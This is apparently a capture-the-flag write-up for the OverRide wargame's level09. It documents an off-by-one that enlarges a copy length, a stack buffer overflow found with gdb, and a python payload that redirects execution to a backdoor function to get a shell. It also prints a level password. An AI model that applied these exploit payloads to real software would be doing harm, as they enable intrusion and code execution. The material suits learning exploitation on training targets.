# level09

after login to `level09` user, there's an `level09` executable in the home directory.

after disassembling it, you will find it at [source.c](source.c).

when we run the executable, it will ask us to input a username, and then it will print a welcome message with the username we just inputted. then it will ask us to input a message, and then it will print "Msg sent!".

```sh
level09@OverRide:~$ ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: 1337
>: Welcome, 1337
>: Msg @Unix-Dude
>>: test
>: Msg sent!
level09@OverRide:~$
```

after taking a look at the source code, the program declare the following variables in the `handle_msg` function:

```c
  char buffer[140];
  long long v2; // 8 bytes
  long long v3; // 8 bytes
  long long v4; // 8 bytes
  long long v5; // 8 bytes
  long long v6; // 8 bytes
  int charsToCopy;       // 4 bytes

  v2 = 0;
  v3 = 0;
  v4 = 0;
  v5 = 0;
  v6 = 0;
  charsToCopy = 140;
```

then it calls `set_username(buffer)` and `set_msg(buffer)`, and then it prints "Msg sent!".

in the set_username function, there's a weird logic, it start from 140 bytes in `buffer`, and then start copying the input username to there, and it will copy at most 41 bytes, that's mean it didn't copy to the buffer, instead it copy to the variables declared after the buffer. but it copy one byte to `charsToCopy`.

then in the `set_msg` function, it ask for message and then it copy the message to the buffer, but it will copy at most `charsToCopy` bytes, and since `charsToCopy` is 140, it will copy at most 140 bytes, but if we input a username of 40 bytes then add a hex byte of `\xff` we will change the value of `charsToCopy` to 255, and then we can input a message of 255 bytes, which will overflow the buffer and overwrite the return address of the function, and then we can control the execution flow of the program.

let's first try to overflow the `charsToCopy` variable by inputting a username of 40 bytes and then add a hex byte of `\xff`.

```sh
level09@OverRide:~$ gdb ./level09
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/users/level09/level09...(no debugging symbols found)...done.
(gdb) r
Starting program: /home/users/level09/level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: ^C
Program received signal SIGINT, Interrupt.
0x00007ffff7b01f30 in read () from /lib/x86_64-linux-gnu/libc.so.6
(gdb) disas handle_msg
Dump of assembler code for function handle_msg:
   0x00005555555548c0 <+0>:     push   %rbp
   0x00005555555548c1 <+1>:     mov    %rsp,%rbp
   0x00005555555548c4 <+4>:     sub    $0xc0,%rsp
   0x00005555555548cb <+11>:    lea    -0xc0(%rbp),%rax
   0x00005555555548d2 <+18>:    add    $0x8c,%rax
   0x00005555555548d8 <+24>:    movq   $0x0,(%rax)
   0x00005555555548df <+31>:    movq   $0x0,0x8(%rax)
   0x00005555555548e7 <+39>:    movq   $0x0,0x10(%rax)
   0x00005555555548ef <+47>:    movq   $0x0,0x18(%rax)
   0x00005555555548f7 <+55>:    movq   $0x0,0x20(%rax)
   0x00005555555548ff <+63>:    movl   $0x8c,-0xc(%rbp)
   0x0000555555554906 <+70>:    lea    -0xc0(%rbp),%rax
   0x000055555555490d <+77>:    mov    %rax,%rdi
   0x0000555555554910 <+80>:    callq  0x5555555549cd <set_username>
   0x0000555555554915 <+85>:    lea    -0xc0(%rbp),%rax
   0x000055555555491c <+92>:    mov    %rax,%rdi
   0x000055555555491f <+95>:    callq  0x555555554932 <set_msg>
   0x0000555555554924 <+100>:   lea    0x295(%rip),%rdi        # 0x555555554bc0
   0x000055555555492b <+107>:   callq  0x555555554730 <puts@plt>
   0x0000555555554930 <+112>:   leaveq
   0x0000555555554931 <+113>:   retq
End of assembler dump.
(gdb) b *0x0000555555554910
Breakpoint 1 at 0x555555554910
(gdb) b *0x000055555555491f
Breakpoint 2 at 0x55555555491f
(gdb)
```
we need first to add two breakpoints, one before `set_username` and one before `set_msg`. then we run the program and input a username of 40 bytes and then add a hex byte of `\xff`.

```sh
0x00005555555548ff <+63>:    movl   $0x8c,-0xc(%rbp)
```
here's where the program is setting the value of `charsToCopy` to 140, and since `charsToCopy` is located at `-0xc(%rbp)`, we can get the address of `charsToCopy` by looking at the value of `rbp` and then subtracting 0xc from it.

`0x7fffffffe5c0 - 0xc = 0x7FFFFFFFE5B4`

```sh
(gdb) p *0x7FFFFFFFE5B4
$2 = 140
(gdb)
```

let's now input a username of 40 bytes and then add a hex byte of `\xff`.

```sh
(gdb) r < <(python -c "print 'A' * 40 + '\xff'")
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/users/level09/level09 < <(python -c "print 'A' * 40 + '\xff'")
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------

Breakpoint 1, 0x0000555555554910 in handle_msg ()
(gdb) p *0x7FFFFFFFE5B4
$13 = 140
(gdb) c
Continuing.
>: Enter your username

Breakpoint 2, 0x000055555555491f in handle_msg ()
(gdb) p *0x7FFFFFFFE5B4
$14 = 255
(gdb)
```

we can see that the value of `charsToCopy` is now 255, which means we can now pass a message of 255 bytes, which will overflow the buffer and overwrite the return address of the function, and then we can control the execution flow of the program.

we will use [this website](https://wiremask.eu/tools/buffer-overflow-pattern-generator/?) to generate a pattern of 255 bytes, and then we will input that pattern as the message.

```sh
(gdb) r < <(python -c "print 'A' * 40 + '\xff\n' + 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4'")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/users/level09/level09 < <(python -c "print 'A' * 40 + '\xff\n' + 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4'")
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------

Breakpoint 1, 0x0000555555554910 in handle_msg ()
(gdb) c
Continuing.
>: Enter your username

Breakpoint 2, 0x000055555555491f in handle_msg ()
(gdb)
Continuing.                                                                                                                                                                                 >>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
0x4138674137674136 in ?? ()
(gdb)
```

as you can see, the program crashed with a segmentation fault, and the instruction pointer is now pointing to `0x4138674137674136`, which is the value of the return address that we overwrote with our pattern. we can now use this information to find the offset of the return address in our pattern, with same website we got the offset at `200` exactly, let's craft new payload and overwrite the return address with the address `0x1333333333333337`.


```sh
(gdb) r < <(python -c "print 'A' * 40 + '\xff\n' + 'A' * 200 + '\x37\x33\x33\x33\x33\x33\x33\x13'")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
                                                                                              Starting program: /home/users/level09/level09 < <(python -c "print 'A' * 40 + '\xff\n' + 'A' * 200 + '\x37\x33\x33\x33\x33\x33\x33\x13'")
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------

Breakpoint 1, 0x0000555555554910 in handle_msg ()
(gdb) c
Continuing.
>: Enter your username

Breakpoint 2, 0x000055555555491f in handle_msg ()                                             (gdb)                                                                                         Continuing.
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
0x1333333333333337 in ?? ()                                                                   (gdb)
```

good, in the source code there's a function called secret_backdoor, that function promt a user for input and call `system` with that input, we need to overwrite the return address with the address of that function, and then we can get a shell.

let's first get the address of the `secret_backdoor` function by disassembling it.

```sh
(gdb) p &secret_backdoor                                                                      $7 = (<text variable, no debug info> *) 0x55555555488c <secret_backdoor>
(gdb)
```

the address of the `secret_backdoor` function is `0x55555555488c`, let's now overwrite the return address with that address.

```sh
(gdb) r < <(python -c "print 'A' * 40 + '\xff\n' + 'A' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00'")
The program being debugged has been started already.                                          Start it from the beginning? (y or n) y

Starting program: /home/users/level09/level09 < <(python -c "print 'A' * 40 + '\xff\n' + 'A' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00'")
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------

Breakpoint 1, 0x0000555555554910 in handle_msg ()
(gdb) c
Continuing.
>: Enter your username

Breakpoint 2, 0x000055555555491f in handle_msg ()
(gdb)
Continuing.                                                                                   >>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: not found

Program received signal SIGSEGV, Segmentation fault.                                          0x0000000000000000 in ?? ()
(gdb)
```

as you can see a new command is executed, but it failed because the input is not a valid command, let's test that payload outside of gdb.

```sh
level09@OverRide:~$ (python -c "print 'A' * 40 + '\xff\n' + 'A' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00'" ; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
whoami
end

Segmentation fault (core dumped)
level09@OverRide:~$
```

we successfully executed `whoami` command, and we got a shell, we can now read the flag.

```sh
level09@OverRide:~$ (python -c "print 'A' * 40 + '\xff\n' + 'A' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00'" ; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```

```sh
end@OverRide:~$ cat end
GG !
end@OverRide:~$
```

a script is created to automate the process of exploiting the vulnerability and getting the flag, you can find it in [exploit.sh](exploit.sh), and make sure to use [payload_crafter.py](./Resources/payload_crafter.py).

cheers!

